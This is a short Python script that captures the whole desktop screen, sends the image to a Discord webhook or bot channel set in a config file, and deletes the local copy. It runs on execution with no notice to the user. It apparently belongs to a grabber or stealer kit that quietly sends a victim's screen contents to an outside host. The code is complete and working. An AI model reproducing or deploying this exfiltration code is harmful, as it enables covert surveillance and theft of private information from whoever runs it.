import discord
from discord.ext import commands
from PIL import ImageGrab
import tempfile
import os
import requests
import json

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
CONFIG_PATH = os.path.join(BASE_DIR, "cfg", "config.txt")

config = {}
if not os.path.exists(CONFIG_PATH):
    raise FileNotFoundError(f"Config file not found: {CONFIG_PATH}")

with open(CONFIG_PATH, encoding="utf-8") as f:
    for line in f:
        if "=" in line:
            key, value = line.strip().split("=", 1)
            config[key] = value

TOKEN = config.get("DISCORD_TOKEN")
CHANNEL_ID = int(config.get("DISCORD_CHANNEL_ID", 0))
WEBHOOK_URL = config.get("WEBHOOK_URL")
OUTPUT_MODE = config.get("OUTPUT_MODE", "bot").lower()

def send_webhook(file_path, message="**📸 Screenshot has been captured and sent!**"):
    with open(file_path, "rb") as f:
        payload = {"content": message}
        files = {"file": f}
        r = requests.post(WEBHOOK_URL, data=payload, files=files)
    print("Sent via webhook:", r.status_code)

def take_screenshot():
    screenshot = ImageGrab.grab()
    temp_dir = tempfile.gettempdir()
    temp_path = os.path.join(temp_dir, "screenshot.png")
    screenshot.save(temp_path, "PNG")
    return temp_path

async def send_via_bot(file_path):
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f"Logged in as {bot.user}")
        channel = bot.get_channel(CHANNEL_ID)
        await channel.send("**📸 Screenshot has been captured and sent!**", file=discord.File(file_path))

        if os.path.exists(file_path):
            os.remove(file_path)

        await bot.close()

    await bot.start(TOKEN)

screenshot_path = take_screenshot()

if OUTPUT_MODE == "webhook" and WEBHOOK_URL:
    send_webhook(screenshot_path)
elif OUTPUT_MODE == "bot" and TOKEN:
    import asyncio
    asyncio.run(send_via_bot(screenshot_path))
else:
    print("Invalid configuration: missing TOKEN or WEBHOOK_URL or OUTPUT_MODE is incorrect.")
